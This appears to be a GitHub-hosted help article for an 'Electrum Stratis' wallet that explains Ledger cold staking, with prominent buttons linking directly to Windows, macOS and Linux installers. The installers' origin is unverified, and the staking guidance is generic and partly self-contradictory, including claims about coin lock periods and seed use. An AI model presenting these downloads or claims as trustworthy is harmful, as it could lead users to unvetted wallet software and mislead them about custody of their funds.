![Electrum-Stratis](assets/banner-article.png)

# Ledger and cold staking: what actually worked

<p align="center">Two keys, one online, one offline</p>

<p align="center"><a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe"><img alt="Download for Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-089ae8?style=for-the-badge&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg"><img alt="Download for macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-089ae8?style=for-the-badge&labelColor=071727&logo=apple&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip"><img alt="Download for Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-089ae8?style=for-the-badge&labelColor=071727&logo=linux&logoColor=ffffff"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" height="24" src="https://img.shields.io/badge/os-windows-089ae8?style=flat-square&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"> | Windows 10 (1909) or later, 64-bit | [`electrum-stratis-v2.7.19.exe`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe) |
| <img alt="macOS" height="24" src="https://img.shields.io/badge/os-macos-089ae8?style=flat-square&labelColor=071727&logo=apple&logoColor=ffffff"> | macOS 12 or later | [`electrum-stratis-v2.7.19.dmg`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg) |
| <img alt="Linux" height="24" src="https://img.shields.io/badge/os-linux-089ae8?style=flat-square&labelColor=071727&logo=linux&logoColor=ffffff"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-stratis-v2.7.19.zip`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip) |

</div>

All versions, installers and checksums are on the [Electrum-Stratis v2.7.19 release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).

> Only download from this GitHub release page.

Cold staking with a hardware wallet worked by keeping the spending key on the device while a separate staking key stayed with the node, so the machine that staked never held the authority to move coins. The setup needed a companion tool and two keys, not a seed phrase typed into a desktop application - and that last point is why the arrangement is still worth understanding. Electrum Stratis is a self-custody desktop wallet for the legacy Stratis chain.

## You'll see this if

<div align="center">

| Setup | Where the spending key lives | Where the staking key lives |
|---|---|---|
| Node-only staking | On the node | On the node |
| Ledger cold staking | On the hardware device | With the node |
| Wallet staking | In the wallet file | In the wallet file |
| Exchange "staking" | With the exchange | With the exchange |

</div>

The middle row is the only one where a compromised machine cannot move the coins, which is the entire point of the arrangement.

## Why it happens

Staking requires a key that signs blocks, and that key has to be available to a machine that is online. If the same key also controls spending, an online machine holds everything, and staking becomes a permanent hot wallet. Cold staking separates the two roles: the online key can stake, the offline key must authorise a spend.

A hardware device is a natural home for the offline half. It signs only when a human approves on the device, and the key never enters the computer's memory. The cost is complexity: two keys, a delegated arrangement, and a companion tool to build the staking setup, which is why the process had a reputation for being fiddly. The payoff is that the online machine can be compromised without the coins moving, which is the only threat model that matters for a node running continuously.

That complexity is also why the seed-free route mattered. A tool that asks for a device's seed defeats the device; a tool that uses the device's keys keeps the boundary intact. The setups that worked were the ones that respected that line.

## Fix

1. **Decide which key goes where before starting.** The spending key belongs on the device; the staking key belongs with the node. Writing this down first prevents the common mistake of putting both in one place.
2. **Use a companion tool that signs on the device.** The device should display the operation and require approval. If a tool asks for the seed instead, it is not a cold-staking tool.
3. **Keep the staking node separate from the spending device.** They can share a machine only if the device still holds the only spending authority.
4. **Record both public keys.** The staking arrangement is described by public data; keeping that record makes a later recovery or audit possible without exposing anything.
5. **Test with a small amount first.** Staking locks coins for a long term; a test run on a small balance confirms the arrangement before the bulk is committed.
6. **Back up what is actually yours to back up.** The device has its own recovery phrase; the node has a wallet file. Both need to survive, and neither is the other.

The wallet can also stake without a device, which makes the hardware setup an extra boundary rather than a requirement; the maintained build on the [release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19) is where the staking support ships. [what an Electrum Stratis seed restores](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/is-the-seed-enough-to-restore.md) and [Electrum Stratis backup models](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/seed-file-and-password-backups.md) are the questions that decide whether that boundary is worth the trouble.

If a step requires the device's seed to be typed into the computer, stop. The whole design exists to prevent that single action.

## If that did not work

If the device is not recognised, the problem is usually the bridge application or the cable rather than the keys; test with the vendor's own tool before touching the staking setup.

If staking does not start, confirm the coins are actually delegated and the node is synced. A node that is behind cannot stake, and a delegation that was never broadcast looks identical in the interface.

If the device is lost, the recovery phrase restores the spending key - which is exactly why that phrase is the most sensitive object in the setup, and why it is never typed into a computer.

## Prevention

- Keep the spending key on the device, always.
- Never enter a device seed into any application.
- Record both public keys outside the wallet.
- Test the arrangement with a small balance.
- Keep the node's wallet file backed up separately from the device's phrase.

## FAQ

### Did cold staking with a Ledger require entering the seed?

No. The setups that worked used the device's keys and signed on the device. Any instruction to type the recovery phrase into a computer would have defeated the purpose of using hardware at all.

### What is the difference between the staking key and the spending key?

The staking key signs while the node is online; the spending key authorises transfers. Cold staking keeps them apart so that compromising the online machine does not give access to the coins.

### Can I stake from the desktop wallet without a hardware device?

Yes, with the trade-off that the wallet file then holds both roles. That is simpler and less safe: the machine that stakes can also spend, so its security becomes the security of the balance.

### Is my Ledger still usable after the staking period ends?

Yes. The device holds the spending key throughout, and when the lock ends the coins are spendable with the device's approval as usual.

<!-- DOWNLOAD-BLOCK -->

Cold staking splits the keys that hold coins from the keys that sign a staking block, and a hardware wallet can only carry the first half if the firmware knows the chain. That is the whole test: does the device recognise the network and derive the address the wallet shows? If it does not, the coins stay spendable from the seed and staking stays off, which is a limitation rather than a loss.

## Related articles

- [The 1567-day countdown, explained](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/the-1567-day-lock.md)
- [Does Stratis work only on STRAX now?](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/does-the-legacy-chain-still-run.md)
- [Standard, multisig and imported wallets](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/standard-multisig-imported-wallets.md)
- [Is Electrum Stratis safe to use?](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/how-safe-is-the-desktop-wallet.md)
